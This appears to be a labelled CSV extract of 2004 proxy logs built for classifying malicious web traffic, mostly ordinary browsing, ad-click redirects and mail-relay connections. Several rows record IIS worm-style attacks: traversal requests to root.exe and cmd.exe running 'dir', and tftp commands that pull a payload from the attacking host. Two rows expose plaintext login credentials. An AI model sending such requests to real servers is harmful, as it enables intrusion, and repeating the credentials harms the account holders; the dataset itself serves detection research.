,ipaddress,dateandtime,url,statuscode,bytessent,refferer,useragent,class,malicious,url_sem_query,qtd_query_params,navegador
288,192.117.242.67,09/Mar/2004:23:03:02 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
289,221.7.192.11,09/Mar/2004:23:03:13 -0500,http://ccbbs.cn/index.asp ,200,12711,"""http://ccbbs.cn/index.asp""",Mozilla/4.0 (compatible; MSIE 5.02; Windows 98),n,0,/index.asp,0,Microsoft Internet Explorer
290,220.173.17.142,09/Mar/2004:23:03:15 -0500,http://www.clickcheaper.com/search.php ,200,19472,"""http://www.163.net""",Mozilla/4.0 (compatible; MSIE 4.0; Windows NT),n,0,/search.php,0,Microsoft Internet Explorer
291,220.173.17.142,09/Mar/2004:23:03:20 -0500,http://clickcheaper.com/go.php?b=zchdzizyzxznznhz&k=szsdsdaaayaxzcacsxaoad&u=aiamscsyshaoah&l=szsdsdaaayaxhchcznzozdsysxapaasicixosnapsnahaohfamsohszxhoazapaxscsxscsdsoafahavaismsxakszafaiavaidffxdvafasskaisismxnamsohxhasfzyzzzahizvhszozmzszidxhxhnskaszmzyhohfchcmckhizmznzifnhxsihvhkhkhxsossschfhphhhdfzzkhfsvasacfkzizdszayapazxdfpfisiaoaysnakaihvhkhahcxzzvhisiscanhkassisiahapsxspshhasiaxaxfmhcxnsicpzadazvhnapsdzkhoahhyaiansdanzfhvzzaaapznzasmachszizphahssyzvhhchxffmsmsyzkhszmsmayhmshzvahsvzoanachkzdhyszsmaazdshakadhvhyzsamapsxccdiffsphvacshsmaczyahzkaozzsaaxhsacaasassaxaiavsshmsxzcaiaiadhmznhcckcfdxhyaissadhyasznhkzzzkznhssmsiscaozoapzpacazaksnzpshsyasszsohxakdyfyxcsdaosdsmapacsxzfzfzisnhzzdahsdsysh&s=axsssismazfp&t= ,300,0,"""http://www.clickcheaper.com/search.php""",Mozilla/4.0 (compatible; MSIE 4.0; Windows NT),m,1,/go.php,6,Microsoft Internet Explorer
292,220.173.17.142,09/Mar/2004:23:03:23 -0500,http://clickcheaper.com/go.php?u=aiamscsyshaoah&l=szsdsdaaayaxhchcznzozdsysxapaasicixosnapsnahaohfamsohszxhoazapaxscsxscsdsoafahavaismsxakszafaiavaidffxdvafasskaisismxnamsohxhasfzyzzzahizvhszozmzszidxhxhnskaszmzyhohfchcmckhizmznzifnhxsihvhkhkhxsossschfhphhhdfzzkhfsvasacfkzizdszayapazxdfpfisiaoaysnakaihvhkhahcxzzvhisiscanhkassisiahapsxspshhasiaxaxfmhcxnsicpzadazvhnapsdzkhoahhyaiansdanzfhvzzaaapznzasmachszizphahssyzvhhchxffmsmsyzkhszmsmayhmshzvahsvzoanachkzdhyszsmaazdshakadhvhyzsamapsxccdiffsphvacshsmaczyahzkaozzsaaxhsacaasassaxaiavsshmsxzcaiaiadhmznhcckcfdxhyaissadhyasznhkzzzkznhssmsiscaozoapzpacazaksnzpshsyasszsohxakdyfyxcsdaosdsmapacsxzfzfzisnhzzdahsdsysh&k=szsdsdaaayaxzcacsxaoad&b=zchdzizyzxznznhz&s=axsssismazfp&x=&t=&tw=&f=420e1fb3563fd0043b18aeab8f313326 ,300,0,"""http://www.clickcheaper.com/search.php""",Mozilla/4.0 (compatible; MSIE 4.0; Windows NT),m,1,/go.php,6,Microsoft Internet Explorer
293,220.173.17.142,09/Mar/2004:23:03:24 -0500,http://www.epilot.com/click.aspx?k=home+buying&b=320&p=kanoodle&s=seeky&pos=9&sid=36ea4e2b-f6b2-4cbf-811e-7514cf65bf41&l=http%3A%2F%2Fwww.kanoodle.com%2Fclickthrough.cool%3Feid%3D1%26clickid%3D12486486%26id%3D4768294%26lid%3Dbhngbinkbknnbonmbmnobknibonpbmnk%26query%3Dhome%2520buying ,300,392,"""http://www.clickcheaper.com/search.php""",Mozilla/4.0 (compatible; MSIE 4.0; Windows NT),m,1,/click.aspx,7,Microsoft Internet Explorer
294,220.173.17.142,09/Mar/2004:23:03:25 -0500,http://www.kanoodle.com/clickthrough.cool?eid=1&clickid=12486486&id=4768294&lid=bhngbinkbknnbonmbmnobknibonpbmnk&query=home%20buying ,300,318,"""http://www.clickcheaper.com/search.php""",Mozilla/4.0 (compatible; MSIE 4.0; Windows NT),n,0,/clickthrough.cool,5,Microsoft Internet Explorer
295,220.173.17.142,09/Mar/2004:23:03:28 -0500,http://www.forsalebyowner.com/ ,200,74903,"""http://www.clickcheaper.com/search.php""",Mozilla/4.0 (compatible; MSIE 4.0; Windows NT),n,0,/,0,Microsoft Internet Explorer
296,68.48.142.117,09/Mar/2004:23:03:33 -0500,/scripts/..%252f../httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%252f../httpodbc.dll,0,without browser
297,203.61.199.15,09/Mar/2004:23:04:45 -0500,http://www.bestobeast.com/members/ ,200,0,"""-""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/members/,0,Microsoft Internet Explorer
298,220.173.17.142,09/Mar/2004:23:05:21 -0500,http://surfcorp.com/s.php?uid=20744&keywords=Home+Business&submit=Go%21 ,200,2243,"""http://www.263.net""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/s.php,3,Microsoft Internet Explorer
299,192.117.242.67,09/Mar/2004:23:05:31 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
300,192.117.242.67,09/Mar/2004:23:05:37 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
301,203.121.182.141,09/Mar/2004:23:06:47 -0500,210.242.13.68:25 ,200,0,"""-""",-,n,0,210.242.13.68:25,0,without browser
302,192.117.242.67,09/Mar/2004:23:08:15 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
303,203.121.182.144,09/Mar/2004:23:09:22 -0500,210.242.12.155:25 ,200,0,"""-""",-,n,0,210.242.12.155:25,0,without browser
304,203.61.199.15,09/Mar/2004:23:09:29 -0500,http://www.bestobeast.com/members/ ,200,0,"""-""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/members/,0,Microsoft Internet Explorer
305,203.61.199.15,09/Mar/2004:23:09:29 -0500,http://www.bestobeast.com/members/ ,200,0,"""-""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/members/,0,Microsoft Internet Explorer
306,203.61.199.15,09/Mar/2004:23:09:29 -0500,http://www.bestobeast.com/members/ ,200,0,"""-""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/members/,0,Microsoft Internet Explorer
307,203.61.199.15,09/Mar/2004:23:09:30 -0500,http://www.bestobeast.com/members/ ,200,0,"""-""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/members/,0,Microsoft Internet Explorer
308,203.61.199.15,09/Mar/2004:23:09:30 -0500,http://www.bestobeast.com/members/ ,200,0,"""-""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/members/,0,Microsoft Internet Explorer
309,203.61.199.15,09/Mar/2004:23:09:30 -0500,http://www.bestobeast.com/members/ ,200,0,"""-""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/members/,0,Microsoft Internet Explorer
310,203.61.199.15,09/Mar/2004:23:09:31 -0500,http://www.bestobeast.com/members/ ,200,0,"""-""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/members/,0,Microsoft Internet Explorer
311,203.61.199.15,09/Mar/2004:23:09:32 -0500,http://www.bestobeast.com/members/ ,200,0,"""-""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/members/,0,Microsoft Internet Explorer
312,192.117.242.67,09/Mar/2004:23:10:31 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
313,192.117.242.67,09/Mar/2004:23:10:31 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
314,218.78.209.42,09/Mar/2004:23:11:08 -0500,81.199.105.30:25 ,200,0,"""-""",-,n,0,81.199.105.30:25,0,without browser
315,212.160.136.163,09/Mar/2004:23:11:18 -0500,http://www.clickcheaper.com/search.php?username=aklimczyk&keywords=opportunity ,200,17891,"""http://www.bodybuilding.powerlifting.ifbbpro.net/""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/search.php,2,Microsoft Internet Explorer
316,217.208.64.55,09/Mar/2004:23:11:21 -0500,http://xxxkiki.com/members/ ,200,0,"""http://xxxkiki.com/members/""",Mozilla/4.0 ( compatible; [jp]; Windows NT5.0; Compaq ),n,0,/members/,0,without browser
317,212.160.136.163,09/Mar/2004:23:11:22 -0500,http://clickcheaper.com/go.php?b=zhhszxzohvzn&k=aishsdaiayaysdscakaisz&u=snskansososkayaiad&l=zxhpznsisaaxsksfhmzchczihdzkhzcixacshshazfzmzzsxhyhohnzdzvsvayhshohozchhzaznzzzohyhdzhzkhyzhzhzyhzcicycnhvdmdmdhhyhdapavavazahznzkzmahaksnafsdszsxhkspsdsmakskapanapsxdkdochsnapsnahaozfaaayasazayzfzyzahvavsczzzzzsscskazzfznzyznzozssvafdfxvdasaavayamaisozizmzhzhzcapacazshaoaysaazayanapsxshafsmsxsnafzhahfmdnxkhxzyzpzpzzshzmhkzyhszaavapzvaospafafhmsnsdasszsasnanaksosmsaazxffhdpazhasnszsnsczmzvzchksvaaadaizmzxzpsaafapsf&tw=znhmzfzhzkzshkhdzozk&s=sfamszayahavsndi&t= ,300,0,"""http://www.clickcheaper.com/search.php?username=aklimczyk&keywords=opportunity""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),m,1,/go.php,7,Microsoft Internet Explorer
318,212.160.136.163,09/Mar/2004:23:11:24 -0500,http://clickcheaper.com/go.php?u=snskansososkayaiad&l=zxhpznsisaaxsksfhmzchczihdzkhzcixacshshazfzmzzsxhyhohnzdzvsvayhshohozchhzaznzzzohyhdzhzkhyzhzhzyhzcicycnhvdmdmdhhyhdapavavazahznzkzmahaksnafsdszsxhkspsdsmakskapanapsxdkdochsnapsnahaozfaaayasazayzfzyzahvavsczzzzzsscskazzfznzyznzozssvafdfxvdasaavayamaisozizmzhzhzcapacazshaoaysaazayanapsxshafsmsxsnafzhahfmdnxkhxzyzpzpzzshzmhkzyhszaavapzvaospafafhmsnsdasszsasnanaksosmsaazxffhdpazhasnszsnsczmzvzchksvaaadaizmzxzpsaafapsf&k=aishsdaiayaysdscakaisz&b=zhhszxzohvzn&s=sfamszayahavsndi&x=&t=&tw=znhmzfzhzkzshkhdzozk&f=ea8a2b9a94f65ec5311a261e023b834e ,300,0,"""http://www.clickcheaper.com/search.php?username=aklimczyk&keywords=opportunity""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),m,1,/go.php,7,Microsoft Internet Explorer
319,212.160.136.163,09/Mar/2004:23:11:25 -0500,http://www.kanoodle.com/clickthrough.cool?position=7003&tid=bhngbnnobonpbhnobnnpzprvrsrsrv&bid=0.05&eid=1&id=76982878&query=opportunity&clickid=73221137&UNQ=00107889187953547659&searchip=192.168.1.103&subid=87 ,300,326,"""http://www.clickcheaper.com/search.php?username=aklimczyk&keywords=opportunity""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),m,1,/clickthrough.cool,10,Microsoft Internet Explorer
320,212.160.136.163,09/Mar/2004:23:11:37 -0500,http://www.franchiseregister.com/?source=kanoodle ,200,19685,"""http://www.clickcheaper.com/search.php?username=aklimczyk&keywords=opportunity""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/,1,Microsoft Internet Explorer
321,203.121.182.189,09/Mar/2004:23:11:49 -0500,210.242.13.180:25 ,200,0,"""-""",-,n,0,210.242.13.180:25,0,without browser
322,24.168.72.174,09/Mar/2004:23:12:08 -0500,http://login.tpe.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=exodus179&passwd=lord ,200,566,"""-""",-,n,0,/config/login,8,without browser
323,192.117.242.67,09/Mar/2004:23:13:14 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
324,217.136.205.206,09/Mar/2004:23:13:43 -0500,http://members.asstraffic.com/secure/pages/index.php ,200,566,"""http://www.clubsandy.com/""",Mozilla/3.01 ( compatible; [dk]; Windows 95; DigiExt ),n,0,/secure/pages/index.php,0,without browser
325,217.136.205.206,09/Mar/2004:23:13:43 -0500,http://members.asstraffic.com/secure/pages/index.php ,200,566,"""http://www.clubsandy.com/""",Mozilla/4.0 ( compatible; MSIE 5.5; Windows NT4.0; win9x/NT 4.90 ),n,0,/secure/pages/index.php,0,Microsoft Internet Explorer
326,61.237.215.17,09/Mar/2004:23:13:45 -0500,http://www.enjoysearching.com/cgi-bin/smartsearch.cgi ,200,609,"""http://www.linkou.con.cn""",Mozilla/4.0 (compatible; MSIE 5.02; Windows NT 5.0),n,0,/cgi-bin/smartsearch.cgi,0,Microsoft Internet Explorer
327,61.237.215.17,09/Mar/2004:23:13:53 -0500,http://enjoysearching.com/ ,200,54314,"""http://www.enjoysearching.com/cgi-bin/smartsearch.cgi""",Mozilla/4.0 (compatible; MSIE 5.02; Windows NT 5.0),n,0,/,0,Microsoft Internet Explorer
328,217.136.205.206,09/Mar/2004:23:13:55 -0500,http://members.asstraffic.com/secure/pages/index.php ,200,566,"""http://www.clubsandy.com/""",Mozilla/4.6 ( compatible; MSIE 5.01; Windows NT4.0; DigiExt ),n,0,/secure/pages/index.php,0,Microsoft Internet Explorer
329,192.117.242.67,09/Mar/2004:23:15:32 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
330,192.117.242.67,09/Mar/2004:23:15:32 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
331,220.175.18.42,09/Mar/2004:23:16:00 -0500,http://www.samair.ru/proxy/proxychecker/results.htm ,200,3939,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Crazy Brow),n,0,/proxy/proxychecker/results.htm,0,Microsoft Internet Explorer
332,220.175.18.42,09/Mar/2004:23:16:02 -0500,http://www.stayinvisible.com/index.pl/ip_test_result_nocache ,200,8030,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Crazy Brow),n,0,/index.pl/ip_test_result_nocache,0,Microsoft Internet Explorer
333,24.42.165.180,09/Mar/2004:23:16:05 -0500,http://24.42.165.180/members/sex/fuck/id000036id/lund1296lundxxx.html ,400,0,"""-""",-,n,0,/members/sex/fuck/id000036id/lund1296lundxxx.html,0,without browser
334,220.175.18.42,09/Mar/2004:23:16:08 -0500,http://www.bidppc.com/cgi-bin/smartsearch.cgi?username=arongyi&keywords=MCSE%20%20 ,200,24678,"""http://www.yourwindow.com""",Mozilla/4.0 (compatible; MSIE 6.0; MSNIA; Windows 98; DigExt),m,1,/cgi-bin/smartsearch.cgi,2,Microsoft Internet Explorer
335,220.175.18.42,09/Mar/2004:23:16:10 -0500,http://www.bidppc.com/cgi-bin/sf.cgi?t=dj&keys=svschmavhisdhdhvhfamsshaacshzfzxskskzvayahapsphysnanzvszsashsvzksphpshszsmsfhcsxacsfsihazizyzzzkamaohmsxscaosahyasaisxaiscamapxnfpzkhhzihdhmaxazsoaksv&kw=mcse&keys2=zmhxhahfhazfznsyspavdddzdhsvcnzfzpfifhdsfszoaczhsyhiaczdsmaczyhmdsdssshshhaxhccsfpdnsyfnddasxfzszkhhfnsssazkzczyzyfdspscdddxcdzxaaafspddsosyxaaifnscfcfvhcfmhsxififnapfsspdzcoavsoddhxhadhshhsczsxhsfcaddfdacizzsmahdmdcspashkchdndsfnspsvfmcmzxavdsszfmdzzkxdzpdhfkaaadfvfozmhyacaafpfzasdkcyxddsfvdpazhcakxdxaanszsmsnfafkhkcmahfksyayfxzmhcxddsffavhzhssizzxvdafnfkfxfcsixfavsvhhddhzfvdsczhdspsyskspaashxkcmaasxahscdhakzhckamaffmfphsdhxhccdssihssffiaixdhofosvdvasaxdaciccaidcfcscfofvadhkazdfspsnaxavcmxnsxfysmdyaiadcdhydydmfiaaskzozfcndmaxdmfffdzoadxmsxspfxsffndpzpapzofhsodfhafkzixkfmazffsxdafvhxzssnfmamafahadxkhsaifhhcsisydoacxnsihihfaxhmsysnhdaiaazosmaahfhfzxhsaazizphkaizszksmhiapsssihvhozxspsxahsispasapxnfnzxhhhchzhaaxazsyaxsi&kw=mcse ,300,1049,"""http://www.bidppc.com/cgi-bin/smartsearch.cgi?username=arongyi&keywords=MCSE%20%20""",Mozilla/4.0 (compatible; MSIE 6.0; MSNIA; Windows 98; DigExt),m,1,/cgi-bin/sf.cgi,4,Microsoft Internet Explorer
336,220.175.18.42,09/Mar/2004:23:16:12 -0500,http://www.djump2it.com/cgi-bin/search/sf.cgi?t=ah&keys=zmhxhahfhazfznsyspavdddzdhsvcnzfzpfifhdsfszoaczhsyhiaczdsmaczyhmdsdssshshhaxhccsfpdnsyfnddasxfzszkhhfnsssazkzczyzyfdspscdddxcdzxaaafspddsosyxaaifnscfcfvhcfmhsxififnapfsspdzcoavsoddhxhadhshhsczsxhsfcaddfdacizzsmahdmdcspashkchdndsfnspsvfmcmzxavdsszfmdzzkxdzpdhfkaaadfvfozmhyacaafpfzasdkcyxddsfvdpazhcakxdxaanszsmsnfafkhkcmahfksyayfxzmhcxddsffavhzhssizzxvdafnfkfxfcsixfavsvhhddhzfvdsczhdspsyskspaashxkcmaasxahscdhakzhckamaffmfphsdhxhccdssihssffiaixdhofosvdvasaxdaciccaidcfcscfofvadhkazdfspsnaxavcmxnsxfysmdyaiadcdhydydmfiaaskzozfcndmaxdmfffdzoadxmsxspfxsffndpzpapzofhsodfhafkzixkfmazffsxdafvhxzssnfmamafahadxkhsaifhhcsisydoacxnsihihfaxhmsysnhdaiaazosmaahfhfzxhsaazizphkaizszksmhiapsssihvhozxspsxahsispasapxnfnzxhhhchzhaaxazsyaxsi&kw=mcse ,300,598,"""http://www.bidppc.com/cgi-bin/smartsearch.cgi?username=arongyi&keywords=MCSE%20%20""",Mozilla/4.0 (compatible; MSIE 6.0; MSNIA; Windows 98; DigExt),m,1,/cgi-bin/search/sf.cgi,3,Microsoft Internet Explorer
337,220.175.18.42,09/Mar/2004:23:16:13 -0500,http://c.ah-ha.com/c?e1=eD1Oxv5QolLydjkWivcIHoNhHJxD5JaQ33zRYtQxlE42TTKiRNr2wgBMNiQykMuAlDYsfzvFwj4IVpRJoBXAfhMuFgGpUt3zABEW4BUfrTonDpisbOLmhbzagmPBZ1C4j0HfOOZVBCpf41mPAMd4PmyBxOlDRzursKGn2dLUAMUNgNVcuiyEZieBXpG1CAtDtaYGzbXDSYlbaFKghzXAIiR1lZjmD44Ef0WXaRlVEHjG2YRtI5IcvIvfbaQUJpvO1sn1rrX40vHbJZyLGVdu15pDAeuvb&h=dy12QHSZ4xBiDDCkg&b=57265 ,300,0,"""http://www.bidppc.com/cgi-bin/smartsearch.cgi?username=arongyi&keywords=MCSE%20%20""",Mozilla/4.0 (compatible; MSIE 6.0; MSNIA; Windows 98; DigExt),m,1,/c,3,Microsoft Internet Explorer
338,220.175.18.42,09/Mar/2004:23:16:14 -0500,http://c.ah-ha.com/c/2?e1=eD1Oxv5QolLydjkWivcIHoNhHJxD5JaQ33zRYtQxlE42TTKiRNr2wgBMNiQykMuAlDYsfzvFwj4IVpRJoBXAfhMuFgGpUt3zABEW4BUfrTonDpisbOLmhbzagmPBZ1C4j0HfOOZVBCpf41mPAMd4PmyBxOlDRzursKGn2dLUAMUNgNVcuiyEZieBXpG1CAtDtaYGzbXDSYlbaFKghzXAIiR1lZjmD44Ef0WXaRlVEHjG2YRtI5IcvIvfbaQUJpvO1sn1rrX40vHbJZyLGVdu15pDAeuvb&h=dy12QHSZ4xBiDDCkg&b=57265 ,300,0,"""http://www.bidppc.com/cgi-bin/smartsearch.cgi?username=arongyi&keywords=MCSE%20%20""",Mozilla/4.0 (compatible; MSIE 6.0; MSNIA; Windows 98; DigExt),m,1,/c/2,3,Microsoft Internet Explorer
339,220.175.18.42,09/Mar/2004:23:16:15 -0500,http://www.redmondexams.com/mcse_practice_exam.htm ,200,13995,"""http://www.bidppc.com/cgi-bin/smartsearch.cgi?username=arongyi&keywords=MCSE%20%20""",Mozilla/4.0 (compatible; MSIE 6.0; MSNIA; Windows 98; DigExt),n,0,/mcse_practice_exam.htm,0,Microsoft Internet Explorer
340,217.136.205.206,09/Mar/2004:23:16:39 -0500,http://members.asstraffic.com/secure/pages/index.php ,200,566,"""http://members.asstraffic.com:80""",Mozilla/3.01 ( compatible; [fr]; Windows 98; DigiExt ),n,0,/secure/pages/index.php,0,without browser
341,203.121.182.141,09/Mar/2004:23:17:36 -0500,200.55.105.107:25 ,500,434,"""-""",-,n,0,200.55.105.107:25,0,without browser
342,203.121.182.142,09/Mar/2004:23:17:37 -0500,128.255.89.26:25 ,200,0,"""-""",-,n,0,128.255.89.26:25,0,without browser
343,68.48.142.117,09/Mar/2004:23:18:05 -0500,/scripts/root.exe?/c+dir ,200,566,"""-""",-,m,1,/scripts/root.exe,0,without browser
344,61.172.244.232,09/Mar/2004:23:18:05 -0500,209.15.20.151:25 ,200,0,"""-""",-,n,0,209.15.20.151:25,0,without browser
345,192.117.242.67,09/Mar/2004:23:18:18 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
346,68.48.142.117,09/Mar/2004:23:18:55 -0500,/scripts/root.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/root.exe,0,without browser
347,68.48.142.117,09/Mar/2004:23:18:55 -0500,/scripts/httpodbc.dll ,400,288,"""-""",-,m,1,/scripts/httpodbc.dll,0,without browser
348,68.48.142.117,09/Mar/2004:23:19:46 -0500,/MSADC/root.exe?/c+dir ,200,566,"""-""",-,m,1,/MSADC/root.exe,0,without browser
349,192.117.242.67,09/Mar/2004:23:20:37 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
350,68.48.142.117,09/Mar/2004:23:20:38 -0500,/MSADC/root.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20httpodbc.dll ,200,566,"""-""",-,m,1,/MSADC/root.exe,0,without browser
351,68.48.142.117,09/Mar/2004:23:20:38 -0500,/MSADC/httpodbc.dll ,400,286,"""-""",-,m,1,/MSADC/httpodbc.dll,0,without browser
352,192.117.242.67,09/Mar/2004:23:20:40 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
353,218.78.209.42,09/Mar/2004:23:21:21 -0500,155.239.124.186:25 ,200,0,"""-""",-,n,0,155.239.124.186:25,0,without browser
354,68.48.142.117,09/Mar/2004:23:21:29 -0500,/c/winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/c/winnt/system32/cmd.exe,0,without browser
355,212.160.136.163,09/Mar/2004:23:22:05 -0500,http://www.qksrv.net/image-1179173-8229697 ,300,76,"""http://strony.wp.pl/wp/kaneda69/""",Mozilla/6.0 [en] (Win98; I),n,0,/image-1179173-8229697,0,without browser
356,212.160.136.163,09/Mar/2004:23:22:08 -0500,http://mirror.qkimg.net/0833/8229697-5 ,200,2886,"""http://strony.wp.pl/wp/kaneda69/""",Mozilla/6.0 [en] (Win98; I),n,0,/0833/8229697-5,0,without browser
357,68.48.142.117,09/Mar/2004:23:22:19 -0500,/c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/c/winnt/system32/cmd.exe,0,without browser
358,24.168.72.174,09/Mar/2004:23:22:28 -0500,http://edit.tpe.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=exodus7999&passwd=Lord ,200,566,"""-""",-,n,0,/config/login,8,without browser
359,68.48.142.117,09/Mar/2004:23:23:10 -0500,/c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/c/winnt/system32/cmd.exe,0,without browser
360,192.117.242.67,09/Mar/2004:23:23:20 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
361,24.201.201.176,09/Mar/2004:23:23:52 -0500,http://www.acsearch.com/ ,200,10824,"""http://www.lln.com""",Mozilla/4.0 (compatible; MSIE 4.0; Windows NT),n,0,/,0,Microsoft Internet Explorer
362,24.201.201.176,09/Mar/2004:23:23:53 -0500,http://www.acsearch.com/index.php?q=RZBbbsMgEEW3UiGVT2cwxthEVndQqR9dgB8kJrHBBVynqbr3jkmlfvDQ4YiZO62S6jsoocjHqv0XOQbFSkWM/dQhztrGp5Nv12HnOeIlCVyRssqKKmNQ4qp3WCiiTyaJDJ/3E7VuJ4OCDEAKRJUia9DetrP+Mxl54H4y/XX1U8I11hpjXNThsG1bdm2tc8Oks97NhyTG0bv1PCJw08vigonG2UYCFDSaoelGe+6sdZ2zS2fs3F3sdL/4uw9+uPUUu2qwJUE1XhjFTUrIec4KmqbQ/Md/ziENgKayaAopa16DpO+vbw0AA1lVdV5yUdWSlyAEDev+f7EHwUnq22I8hjXqofKcw/HnFw== ,300,0,"""http://www.acsearch.com/""",Mozilla/4.0 (compatible; MSIE 4.0; Windows NT),m,1,/index.php,1,Microsoft Internet Explorer
363,24.201.201.176,09/Mar/2004:23:23:54 -0500,http://www.kanoodle.com/clickthrough.cool?position=7004&tid=bhngbnnobonpbinmbjnlzjrzrsrdxc&bid=0.05&eid=1&id=77023214&query=investment%20fraud&clickid=57793907&UNQ=00107889263589736055&subid=4 ,300,311,"""http://www.acsearch.com/""",Mozilla/4.0 (compatible; MSIE 4.0; Windows NT),m,1,/clickthrough.cool,9,Microsoft Internet Explorer
364,24.201.201.176,09/Mar/2004:23:23:56 -0500,http://www.beamlaw.com/ ,200,6142,"""http://www.acsearch.com/""",Mozilla/4.0 (compatible; MSIE 4.0; Windows NT),n,0,/,0,Microsoft Internet Explorer
365,68.48.142.117,09/Mar/2004:23:24:00 -0500,/c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/c/winnt/system32/cmd.exe,0,without browser
366,68.48.142.117,09/Mar/2004:23:24:00 -0500,/c/httpodbc.dll ,400,282,"""-""",-,m,1,/c/httpodbc.dll,0,without browser
367,203.61.199.15,09/Mar/2004:23:24:15 -0500,http://www.bestobeast.com/members/ ,200,0,"""-""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/members/,0,Microsoft Internet Explorer
368,203.61.199.15,09/Mar/2004:23:24:15 -0500,http://www.bestobeast.com/members/ ,200,0,"""-""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/members/,0,Microsoft Internet Explorer
369,203.61.199.15,09/Mar/2004:23:24:15 -0500,http://www.bestobeast.com/members/ ,200,0,"""-""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/members/,0,Microsoft Internet Explorer
370,203.61.199.15,09/Mar/2004:23:24:15 -0500,http://www.bestobeast.com/members/ ,200,0,"""-""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/members/,0,Microsoft Internet Explorer
